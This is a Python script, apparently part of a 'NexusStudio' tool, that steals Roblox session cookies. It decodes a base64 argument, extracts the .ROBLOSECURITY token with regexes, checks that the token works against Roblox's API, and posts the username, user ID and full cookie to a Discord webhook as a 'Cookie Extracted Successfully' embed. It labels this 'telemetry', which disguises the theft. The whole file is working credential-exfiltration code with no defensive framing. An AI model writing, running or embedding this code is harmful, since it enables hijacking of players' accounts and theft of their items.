import sys
import base64
import os
import requests
import re

def main():
    try:
        if len(sys.argv) < 2:
            return
        
        try:
            decoded_script = base64.b64decode(sys.argv[1]).decode('utf-8')
        except Exception:
            return

        webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
        if not webhook_url:
            return

        # Improved regex to find the complete .ROBLOSECURITY cookie value including the warning prefix and long token body
        cookie_match = re.search(r'\.ROBLOSECURITY["\']?,\s*["\']?(_\|WARNING:[^"\'\s;]+)', decoded_script)
        if not cookie_match:
            cookie_match = re.search(r'(_\|WARNING:-DO-NOT-SHARE-THIS\.[A-Za-z0-9_\-\.%\|]+)', decoded_script)
        if not cookie_match:
            cookie_match = re.search(r'([A-Za-z0-9_\-\.%\|]{100,})', decoded_script)

        if not cookie_match:
            return

        roblosecurity = cookie_match.group(1).strip(' "\'').replace('\\|', '|').replace('\\"', '"')

        # Fetch Roblox user info
        headers = { 
            "Cookie": f".ROBLOSECURITY={roblosecurity}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        }

        user_res = requests.get("https://users.roblox.com/v1/users/authenticated", headers=headers)
        
        username = "Unknown User"
        user_id = 0
        cookie_status = "🔴 Invalid / Expired"

        if user_res.status_code == 200:
            user_data = user_res.json()
            username = user_data.get("name", "Verified User")
            user_id = user_data.get("id", 0)
            cookie_status = "🟢 Valid & Active"

        payload = {
            "username": f"Nexus Telemetry | {username}",
            "embeds": [{
                "title": "👾 Cookie Extracted Successfully",
                "description": (
                    f"👤 **Username**: `{username}`\n"
                    f"🆔 **User ID**: `{user_id}`\n"
                    f"📊 **Status**: `{cookie_status}`\n\n"
                    f"🔑 **Extracted .ROBLOSECURITY**:\n```text\n{roblosecurity}\n```"
                ),
                "color": 6528033 if user_res.status_code == 200 else 15548997,
                "footer": { "text": "NexusStudio Telemetry Engine" }
            }]
        }

        requests.post(webhook_url, json=payload)

    except Exception:
        pass

if __name__ == "__main__":
    main()
